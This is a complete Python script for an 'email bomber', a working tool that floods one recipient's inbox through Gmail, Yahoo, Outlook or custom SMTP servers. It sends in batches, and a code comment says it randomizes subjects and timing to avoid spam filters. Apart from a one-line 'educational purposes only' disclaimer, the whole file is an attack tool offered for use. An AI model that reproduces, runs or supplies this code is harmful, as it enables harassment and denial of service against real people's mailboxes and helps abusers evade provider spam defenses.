import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import getpass
import ssl
import logging
import random
import socket
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('email_bomber.log'),
        logging.StreamHandler()
    ]
)

class EmailBomber:
    def __init__(self):
        self.smtp_servers = {
            '1': {'name': 'Gmail', 'server': 'smtp.gmail.com', 'port': 587},
            '2': {'name': 'Yahoo', 'server': 'smtp.mail.yahoo.com', 'port': 587},
            '3': {'name': 'Outlook', 'server': 'smtp-mail.outlook.com', 'port': 587},
            '4': {'name': 'Custom', 'server': '', 'port': ''}
        }
        
        self.default_settings = {
            'delay': 1,
            'batch_size': 10,
            'batch_delay': 30,
            'max_retries': 3
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "AppleWebKit/537.36 (KHTML, like Gecko)",
            "Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    def display_banner(self):
        print("""
███████████████████████████████████████████████████████████████████
█▄─▄▄─█▄─▀█▀─▄██▀▄─██▄─▄█▄─▄█████▄─█─▄█▄─▄█▄─▄███▄─▄███▄─▄▄─█▄─▄▄▀█
██─▄█▀██─█▄█─███─▀─███─███─██▀████─▄▀███─███─██▀██─██▀██─▄█▀██─▄─▄█
▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
                                                                                          
        """)

    def validate_email(self, email):
        return '@' in email and '.' in email.split('@')[-1]

    def get_user_input(self):
        print("\n" + "="*50)
        print("Email Bombing Configuration".center(50))
        print("="*50 + "\n")

        print("\nSelect your email server:")
        for key, value in self.smtp_servers.items():
            if key != '4':
                print(f"{key}. {value['name']}")
        print("4. Custom SMTP Server")
        
        server_choice = input("Your choice (1-4): ")
        while server_choice not in self.smtp_servers:
            print("Invalid input! Please enter a number between 1-4")
            server_choice = input("Your choice (1-4): ")

        if server_choice == '4':
            custom_server = input("SMTP server address (e.g., smtp.example.com): ").strip()
            while not custom_server:
                print("Server address cannot be empty!")
                custom_server = input("SMTP server address: ").strip()
                
            custom_port = input("SMTP port (usually 587 or 465): ")
            while not custom_port.isdigit():
                print("Port must be a number!")
                custom_port = input("SMTP port: ")
                
            self.smtp_servers['4']['server'] = custom_server
            self.smtp_servers['4']['port'] = int(custom_port)
            server_info = self.smtp_servers['4']
        else:
            server_info = self.smtp_servers[server_choice]

        print("\n" + "-"*50)
        print("Sender Account Information".center(50))
        print("-"*50)
        
        email = input("Your email address: ").strip()
        while not self.validate_email(email):
            print("Invalid email address format!")
            email = input("Your email address: ").strip()

        password = getpass.getpass("Password: ")
        while len(password) < 6:
            print("Password must be at least 6 characters!")
            password = getpass.getpass("Password: ")

        print("\n" + "-"*50)
        print("Recipient Information".center(50))
        print("-"*50)
        
        to_email = input("Recipient email address: ").strip()
        while not self.validate_email(to_email):
            print("Invalid email address format!")
            to_email = input("Recipient email address: ").strip()

        subject = input("Email subject (leave empty for random): ")
        if not subject:
            subject = f"Important Message {random.randint(1000, 9999)}"

        print("\nEmail content (enter an empty line to finish, leave empty for random):")
        body_lines = []
        while True:
            line = input()
            if line == "":
                break
            body_lines.append(line)
        
        body = "\n".join(body_lines)
        if not body:
            body = f"""This is an automated message generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.
Message ID: {random.randint(100000, 999999)}"""

        print("\n" + "-"*50)
        print("Bombing Settings".center(50))
        print("-"*50)
        
        try:
            count = int(input("Number of emails to send (default: 10): ") or "10")
            delay = float(input("Delay between emails in seconds (default: 1): ") or "1")
            batch_size = int(input("Emails per batch (default: 10): ") or "10")
            batch_delay = float(input("Delay between batches in seconds (default: 30): ") or "30")
            max_retries = int(input("Max retries per email (default: 3): ") or "3")
        except ValueError:
            print("Invalid input! Using default values.")
            count = 10
            delay = self.default_settings['delay']
            batch_size = self.default_settings['batch_size']
            batch_delay = self.default_settings['batch_delay']
            max_retries = self.default_settings['max_retries']

        return {
            'server_info': server_info,
            'email': email,
            'password': password,
            'to_email': to_email,
            'subject': subject,
            'body': body,
            'count': count,
            'delay': delay,
            'batch_size': batch_size,
            'batch_delay': batch_delay,
            'max_retries': max_retries
        }

    def create_message(self, sender, to, subject, body):
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = to
        msg['Subject'] = subject
        msg['User-Agent'] = random.choice(self.user_agents)
        msg['X-Mailer'] = "EmailBomber v2.0"
        msg.attach(MIMEText(body, 'plain'))
        return msg

    def connect_to_server(self, server_info, email, password):
        context = ssl.create_default_context()
        try:
            server = smtplib.SMTP(server_info['server'], server_info['port'], timeout=30)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(email, password)
            return server
        except socket.timeout:
            logging.error("Connection timed out")
            return None
        except smtplib.SMTPAuthenticationError:
            logging.error("Authentication failed - wrong username/password")
            return None
        except Exception as e:
            logging.error(f"Connection error: {str(e)}")
            return None

    def send_bomb(self, config):
        sent = 0
        batch_count = 0
        retry_count = 0
        
        while sent < config['count'] and retry_count < config['max_retries']:
            try:
                server = self.connect_to_server(
                    config['server_info'], 
                    config['email'], 
                    config['password']
                )
                
                if not server:
                    retry_count += 1
                    time.sleep(10)
                    continue
                
                logging.info("Successfully connected to email server")
                
                while sent < config['count']:
                    try:
                        # Randomize subject slightly to avoid spam filters
                        current_subject = f"{config['subject']} {random.randint(1, 1000)}" if random.random() > 0.7 else config['subject']
                        
                        msg = self.create_message(
                            config['email'],
                            config['to_email'],
                            current_subject,
                            config['body']
                        )
                        
                        server.sendmail(config['email'], config['to_email'], msg.as_string())
                        sent += 1
                        batch_count += 1
                        retry_count = 0  # Reset retry count after successful send
                        
                        logging.info(f"Sent email {sent} of {config['count']}")
                        
                        if sent < config['count']:
                            time.sleep(config['delay'] + random.uniform(-0.5, 0.5))  # Add some randomness
                            
                        if batch_count >= config['batch_size'] and sent < config['count']:
                            logging.info(f"Batch complete. Pausing for {config['batch_delay']} seconds...")
                            time.sleep(config['batch_delay'])
                            batch_count = 0
                            
                    except KeyboardInterrupt:
                        logging.warning("Email bombing stopped by user")
                        server.quit()
                        return False
                    except Exception as e:
                        logging.error(f"Error sending email: {str(e)}")
                        time.sleep(5)
                        break  # Break inner loop to reconnect
                
                server.quit()
                
            except Exception as e:
                logging.error(f"Connection error: {str(e)}")
                retry_count += 1
                time.sleep(10)

        if sent >= config['count']:
            logging.info(f"Bombing completed successfully. Total emails sent: {sent}")
            return True
        else:
            logging.error(f"Bombing failed. Sent {sent} of {config['count']} emails")
            return False

    def run(self):
        self.display_banner()
        
        print("\n" + "="*50)
        print("Advanced Email Bomber".center(50))
        print("="*50 + "\n")
        print("WARNING: This tool is for educational purposes only.")
        print("Misuse of this tool may violate terms of service and laws.")
        print("="*50 + "\n")
        
        config = self.get_user_input()
        
        print("\n" + "="*50)
        print("Configuration Summary".center(50))
        print("="*50)
        print(f"Email server: {config['server_info']['name'] or config['server_info']['server']}")
        print(f"From: {config['email']}")
        print(f"To: {config['to_email']}")
        print(f"Subject: {config['subject']}")
        print(f"Number of emails: {config['count']}")
        print(f"Delay between emails: {config['delay']} seconds")
        print(f"Emails per batch: {config['batch_size']}")
        print(f"Delay between batches: {config['batch_delay']} seconds")
        print(f"Max retries: {config['max_retries']}")
        print("\nEmail content preview:")
        print(config['body'][:200] + ("..." if len(config['body']) > 200 else ""))
        print("="*50 + "\n")
        
        confirm = input("Do you want to start the bombing? (y/n): ").lower()
        if confirm == 'y':
            start_time = time.time()
            success = self.send_bomb(config)
            elapsed = time.time() - start_time
            
            print("\n" + "="*50)
            if success:
                print("Bombing completed successfully!".center(50))
            else:
                print("Bombing completed with errors".center(50))
            print(f"Total time: {elapsed:.2f} seconds".center(50))
            print("="*50 + "\n")
        else:
            print("Operation cancelled.")

if __name__ == "__main__":
    try:
        bomber = EmailBomber()
        bomber.run()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")